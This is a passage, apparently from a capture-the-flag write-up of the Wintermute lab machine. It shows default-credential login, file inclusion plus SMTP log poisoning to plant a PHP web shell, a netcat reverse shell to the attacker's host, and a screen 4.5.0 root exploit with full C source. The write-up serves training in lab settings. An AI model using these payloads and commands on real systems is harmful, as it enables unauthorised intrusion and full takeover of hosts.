http://192.168.179.180/freeside             &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 321] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://192.168.179.180/freeside/]
http://192.168.179.180/server-status        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 303]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the &lt;strong&gt;freeside&lt;/strong&gt; directory there is a page with an image, nothing was found when listing in this directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/wintermute/screenshot-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Enumeration on port 3000&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;On port 3000 there is an ntopng web form, we log in with admin as username and password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/wintermute/screenshot-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/wintermute/screenshot-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Browsing the web page clicking on the &lt;strong&gt;Flows&lt;/strong&gt; tab I found a table that contains two directories, the one we know is &lt;strong&gt;/freeside/&lt;/strong&gt;, and the other is &lt;strong&gt;/turing-bolo/&lt;/strong&gt;, as we can see these are running on port 80.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/wintermute/screenshot-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We access the &lt;strong&gt;/turing-bolo&lt;/strong&gt; directory on port 80 and it greets us with a web page, then we look for the user &lt;strong&gt;Case&lt;/strong&gt; to see the activity log.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/wintermute/screenshot-6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see a message for the user &lt;strong&gt;Case&lt;/strong&gt;, and the other available members.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/wintermute/screenshot-7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This page is including files with &lt;strong&gt;.log&lt;/strong&gt; extension, through the &lt;strong&gt;bolo&lt;/strong&gt; parameter we include the &lt;strong&gt;/var/log/mail.log&lt;/strong&gt; file without the extension, and we can see the logs from SMTP service.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/wintermute/screenshot-8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can inject php code into the SMTP log file, we insert the &lt;strong&gt;phpinfo()&lt;/strong&gt; function to connect to the SMTP service on port 25.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 192.168.179.180 25
straylight &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.180] 25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;smtp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; open
220 straylight ESMTP Postfix &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian/GNU&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
VRFY &amp;lt;?php phpinfo&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ?&amp;gt;
501 5.1.3 Bad recipient address syntax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We loaded the web page, and we can see that the php code is executing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/wintermute/screenshot-9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;h3 id=&quot;smtp-log-poisoning&quot;&gt;SMTP Log Poisoning&lt;/h3&gt;

&lt;p&gt;Using the above procedure we inject a web shell&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 192.168.179.180 25
straylight &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.180] 25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;smtp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; open
220 straylight ESMTP Postfix &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian/GNU&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
VRFY &amp;lt;?php &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;shell_exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ?&amp;gt;
501 5.1.3 Bad recipient address syntax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We check that the &lt;strong&gt;id&lt;/strong&gt; command is being executed correctly.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.179.180/turing-bolo/bolo.php?bolo=/var/log/mail&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cmd=id&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Illegal'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; +2 | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $NF}'&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We check that netcat is installed on the target.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.179.180/turing-bolo/bolo.php?bolo=/var/log/mail&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cmd=whereis nc&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Illegal'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; +2 | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $NF}'&lt;/span&gt;
 /bin/nc.traditional /bin/nc /usr/share/man/man1/nc.1.gz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We start a netcat listener on port 433, and execute the following curl request.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.179.180/turing-bolo/bolo.php?bolo=/var/log/mail&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cmd=nc 192.168.179.1 443 -e /bin/bash&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have a shell with privileges of user www-data.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.180] 38922
python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import pty; pty.spawn('/bin/bash')&quot;&lt;/span&gt;
www-data@straylight:/var/www/html/turing-bolo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When listing the SUID binaries, screen-4.5.0 was detected, this is a vulnerable version that allows privilege escalation.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@straylight:/home/turing-police&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
&amp;lt;uring-police&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
/bin/su
/bin/umount
/bin/mount
/bin/screen-4.5.0
/bin/ping
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
www-data@straylight:/home/turing-police&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;h3 id=&quot;screen-450&quot;&gt;Screen 4.5.0&lt;/h3&gt;

&lt;p&gt;The vulnerability consists in that the check opens the logfile with full root privileges. This allows us to truncate any file or create a root-owned file with any contents in any directory and can be easily exploited to full root access in several ways.&lt;/p&gt;

&lt;p&gt;We download the exploit.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget https://www.exploit-db.com/download/41154 &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; exploit.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I broke down the exploit, so it was not possible to run it directly.&lt;/p&gt;

&lt;p&gt;libhax.c&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__constructor__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dropshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;chown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/rootshell&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;chmod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/rootshell&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;04755&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;unlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/etc/ld.so.preload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] done!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;rootshell.c&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;seteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;execvp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We verify that gcc is installed on the target.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@straylight:/var/www/html/turing-bolo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which gcc
which gcc
/usr/bin/gcc
www-data@straylight:/var/www/html/turing-bolo&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We start a python web server on port 80.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we transfer the c lenguage files to the victim machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@straylight:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget 192.168.179.1/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;libhax.c,rootshell.c&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We compile them.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@straylight:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-fPIC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-shared&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ldl&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /tmp/libhax.so /tmp/libhax.c 
www-data@straylight:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /tmp/rootshell /tmp/rootshell.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We execute the following commands and we get root.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@straylight:/etc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc
www-data@straylight:/etc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;umask &lt;/span&gt;000
&lt;span class=&quot;nb&quot;&gt;umask &lt;/span&gt;000
www-data@straylight:/etc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/bin/screen-4.5.0 &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; ld.so.preload &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a/tmp/libhax.so&quot;&lt;/span&gt;
&amp;lt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; ld.so.preload &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a/tmp/libhax.so&quot;&lt;/span&gt;
www-data@straylight:/etc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/bin/screen-4.5.0 &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt;
/bin/screen-4.5.0 &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

www-data@straylight:/etc$ /tmp/rootshell
/tmp/rootshell
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We read the flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python -c &quot;import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')&quot;&lt;/span&gt;
python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')&quot;&lt;/span&gt;
root@straylight:/etc# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
root@straylight:/root# &lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;flag.txt  note.txt  scripts
root@straylight:/root# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
5ed185fd75a8d6a7056c96a436c6d8aa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We found a note containing a message about a Tomcat web service and a directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@straylight:/root# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;note&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;note&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
Devs,

Lady 3Jane has asked us to create a custom java app on Neuromancer&lt;span class=&quot;s1&quot;&gt;'s primary server to help her interact w/ the AI via a web-based GUI.

The engineering team couldn'&lt;/span&gt;t strss enough how risky that is, opening up a Super AI to remote access on the Freeside network. It is within out internal admin network, but still, it should be off the network completely. For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Anyways, we&lt;span class=&quot;s1&quot;&gt;'ve deployed the war file on tomcat as ordered - located here:

/struts2_2.3.15.1-showcase

It'&lt;/span&gt;s ready &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the devs to customize to her liking...I&lt;span class=&quot;s1&quot;&gt;'m stating the obvious, but make sure to secure this thing.

Regards,

Bob Laugh
Turing Systems Engineer II
Freeside//Straylight//Ops5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We list the network interfaces.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@straylight:/root/scripts# ifconfig
ifconfig
enp0s3: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
        inet 192.168.179.181  netmask 255.255.255.0  broadcast 192.168.179.255
        inet6 fe80::a00:27ff:fe83:6d5c  prefixlen 64  scopeid 0x20&amp;lt;&lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
        ether 08:00:27:83:6d:5c  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX packets 2271  bytes 231817 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;226.3 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2981  bytes 276415 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;269.9 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

enp0s8: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
        inet 192.168.56.105  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::a00:27ff:fe92:ffec  prefixlen 64  scopeid 0x20&amp;lt;&lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
        ether 08:00:27:92:ff:ec  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX packets 24  bytes 6942 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6.7 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX errors 0  dropped 0  overruns 0  frame 0
